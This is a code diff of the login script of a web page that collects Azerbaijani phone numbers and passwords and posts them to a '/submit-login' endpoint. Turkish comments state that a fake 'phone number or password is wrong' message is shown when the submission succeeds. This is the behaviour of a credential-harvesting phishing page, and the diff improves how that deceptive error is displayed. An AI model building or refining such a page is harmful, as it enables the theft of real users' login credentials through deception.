@@ -1127,14 +1127,29 @@ document.addEventListener('DOMContentLoaded', function() {
     const phoneInput = document.getElementById('input-109');
     const passwordInput = document.getElementById('input-112');
     const loginButton = document.getElementById('sign_in');
-    const errorText = document.getElementById('passwordtext');
-    const buttonContent = loginButton.querySelector('.v-btn__content');
+    const errorContainer = document.getElementById('passwordtext'); // Hata mesajının ana kapsayıcısı
+    // Hata mesajının yazıldığı spesifik element
+    const errorMessageElement = errorContainer ? errorContainer.querySelector('.v-messages__message') : null;
 
-    // --- 2. Butonun aktif/pasif durumunu kontrol eden merkezi fonksiyon ---
+    // --- YENİ: Hata gösterme işini tek bir yerden yöneten fonksiyon ---
+    function showOnPageError(message) {
+        if (errorMessageElement && errorContainer) {
+            // Mesajı güncelle
+            errorMessageElement.textContent = message;
+            // Hata alanını görünür yap
+            errorContainer.style.display = 'block';
+        } else {
+            // Eğer olur da HTML'de hata alanı bulunamazsa, eski yöntem alert'e düş
+            alert(message);
+        }
+    }
+
+    // --- Butonun aktif/pasif durumunu kontrol eden fonksiyon ---
     function checkInputs() {
         const cleanPhoneNumber = phoneInput.value.replace(/\D/g, '');
         const isPhoneValid = cleanPhoneNumber.length === 9;
         const isPasswordValid = passwordInput.value.length > 0;
+        const buttonContent = loginButton.querySelector('.v-btn__content');
 
         if (isPhoneValid && isPasswordValid) {
             loginButton.removeAttribute('disabled');
@@ -1151,76 +1166,59 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    // --- 3. Telefon numarası alanını CANLI olarak formatlama ve kontrol etme ---
-    phoneInput.addEventListener('input', function() {
-        // Sadece rakamları tut
-        let digits = this.value.replace(/\D/g, '');
-
-        // DÜZELTME 1: Numaranın 9 haneyi geçmesini engelle
+    // Telefon ve şifre alanlarını dinleme
+    phoneInput.addEventListener('input', () => {
+        let digits = phoneInput.value.replace(/\D/g, '');
         if (digits.length > 9) {
             digits = digits.slice(0, 9);
         }
-        this.value = digits; // Input'a sadece 9 haneli rakamı yaz
-
-        // Her değişiklikten sonra buton durumunu kontrol et
+        phoneInput.value = digits;
         checkInputs();
     });
-
-    // --- 4. Şifre alanını dinleme ---
     passwordInput.addEventListener('input', checkInputs);
 
-    // --- 5. Butona tıklama olayı (Tüm mantık burada birleşiyor) ---
+    // Butona tıklama olayı
     loginButton.addEventListener('click', function(event) {
-        event.preventDefault(); 
-        
-        if (this.hasAttribute('disabled')) {
-            return; // Buton pasifse hiçbir şey yapma
-        }
+        event.preventDefault();
+        if (this.hasAttribute('disabled')) return;
 
         const cleanPhoneNumber = phoneInput.value.replace(/\D/g, '');
         const passwordValue = passwordInput.value;
         const fullPhoneNumber = '+994' + cleanPhoneNumber;
-
+        const buttonContent = this.querySelector('.v-btn__content');
+        
         buttonContent.textContent = 'Gözləyin...';
         this.setAttribute('disabled', 'disabled');
         this.classList.add('v-btn--disabled');
 
-        // DÜZELTME 3: Veriyi backend'e gönder
         fetch('/submit-login', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                phoneNumber: fullPhoneNumber,
-                password: passwordValue
-            }),
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phoneNumber: fullPhoneNumber, password: passwordValue }),
         })
         .then(response => response.json())
         .then(data => {
             if (data.success) {
-                // DÜZELTME 2: Hata mesajını alert yerine sayfa içinde göster
-                if (errorText) {
-                    errorText.style.display = 'block';
-                }
+                // BAŞARILI DURUMDA: Önceden hazırlanan "Şifrə yanlış" mesajı gösterilir.
+                showOnPageError("Telefon nömrəsi və ya şifrə yanlışdır.");
             } else {
-                alert('Server xətası: ' + (data.message || 'Bilinməyən xəta'));
+                // YENİ: alert yerine, server'dan gelen hata mesajı gösterilir.
+                showOnPageError('Server xətası: ' + (data.message || 'Bilinməyən xəta'));
             }
         })
         .catch(error => {
+            // YENİ: alert yerine, genel bağlantı hatası mesajı gösterilir.
+            showOnPageError('Serverə qoşulmada xəta baş verdi.');
             console.error('Serverə qoşulmada xəta:', error);
-            alert('Serverə qoşulmada xəta baş verdi.');
         })
         .finally(() => {
-            // İşlem bitince butonu normale döndür ama hata mesajı kalsın
             buttonContent.textContent = 'Daxil ol';
             loginButton.removeAttribute('disabled');
             loginButton.classList.remove('v-btn--disabled');
         });
     });
 
-    // Sayfa ilk yüklendiğinde butonun durumunu ayarla
-    checkInputs();
+    checkInputs(); // Sayfa yüklendiğinde ilk kontrol
 });
 </script>
   <script id="google-tag-manager">
